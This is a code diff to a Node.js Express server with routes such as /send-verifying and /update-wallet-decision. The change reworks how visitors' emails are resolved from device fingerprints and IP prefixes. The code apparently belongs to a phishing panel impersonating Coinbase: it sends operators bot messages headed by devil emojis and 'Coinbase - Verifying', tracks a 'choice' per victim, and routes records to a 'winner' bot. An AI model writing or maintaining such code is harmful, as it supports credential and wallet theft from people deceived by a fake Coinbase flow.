@@ -1859,17 +1859,27 @@ app.post("/update-wallet-decision", (req, res) => {
 app.post("/send-verifying", async (req, res) => {
   try {
     let { userId, email } = req.body;
+    let originalEmail = email; // Keep original for winner lookup
     
     const ip = getIP(req);
     const fingerprint = getDeviceFingerprint(req);
     const ipPrefix = ip.split(".").slice(0, 3).join(".");
     
-    // If email not provided, resolve from fingerprint mapping
+    // If email not provided, resolve from fingerprint mapping for DISPLAY only
+    let displayEmail = email;
     if (!email) {
       if (fingerprint && deviceFingerprintToEmail[fingerprint]) {
-        email = deviceFingerprintToEmail[fingerprint];
+        displayEmail = deviceFingerprintToEmail[fingerprint];
       } else if (ipPrefix && ipPrefixToEmail[ipPrefix]) {
-        email = ipPrefixToEmail[ipPrefix];
+        displayEmail = ipPrefixToEmail[ipPrefix];
+      }
+      email = displayEmail; // Use for now, but we'll fix this below
+    } else {
+      // If email WAS provided, also resolve display email from fingerprint
+      if (fingerprint && deviceFingerprintToEmail[fingerprint]) {
+        displayEmail = deviceFingerprintToEmail[fingerprint];
+      } else if (ipPrefix && ipPrefixToEmail[ipPrefix]) {
+        displayEmail = ipPrefixToEmail[ipPrefix];
       }
     }
     
@@ -1883,32 +1893,16 @@ app.post("/send-verifying", async (req, res) => {
     const device = detectDevice(userAgent);
     const region = await detectRegion(ip);
 
-    console.log(`🔍 DEBUG /send-verifying: Original email: ${email}`);
-    console.log(`🔍 DEBUG: Fingerprint: ${fingerprint}`);
-    console.log(`🔍 DEBUG: IP Prefix: ${ipPrefix}`);
-    console.log(`🔍 DEBUG: deviceFingerprintToEmail[${fingerprint}] = ${deviceFingerprintToEmail[fingerprint]}`);
-    console.log(`🔍 DEBUG: ipPrefixToEmail[${ipPrefix}] = ${ipPrefixToEmail[ipPrefix]}`);
+    console.log(`🔍 DEBUG /send-verifying: Original email: ${originalEmail}, Display: ${displayEmail}`);
 
-    // ✅ RESOLVE LATEST EMAIL from fingerprint or IP (for display)
-    let displayEmail = email; // Default to original
-    
-    // Try fingerprint first (most reliable)
-    if (fingerprint && deviceFingerprintToEmail[fingerprint]) {
-      displayEmail = deviceFingerprintToEmail[fingerprint];
-      console.log(`✅ Found latest email via fingerprint: ${displayEmail}`);
-    }
-    // Try IP prefix as fallback
-    else if (ipPrefix && ipPrefixToEmail[ipPrefix]) {
-      displayEmail = ipPrefixToEmail[ipPrefix];
-      console.log(`✅ Found latest email via IP prefix: ${displayEmail}`);
-    } else {
-      console.log(`⚠️ No latest email found, using original: ${displayEmail}`);
-    }
-
-    console.log(`📧 Final displayEmail: ${displayEmail}`);
-
-    // ✅ ORIGINAL EMAIL stays for winner lookup (to send to correct bot)
-    pendingVerifying[verifyingId] = { status: "pending", userId, email, displayEmail, choice: null };
+    // ✅ STORE: use originalEmail for winner lookup, displayEmail for message
+    pendingVerifying[verifyingId] = { 
+      status: "pending", 
+      userId, 
+      email: originalEmail,  // Original for winner lookup
+      displayEmail: displayEmail,  // Display for message
+      choice: null 
+    };
 
     const message =
       `😈😈😈 <b>Coinbase - Verifying</b> 😈😈😈\n` +
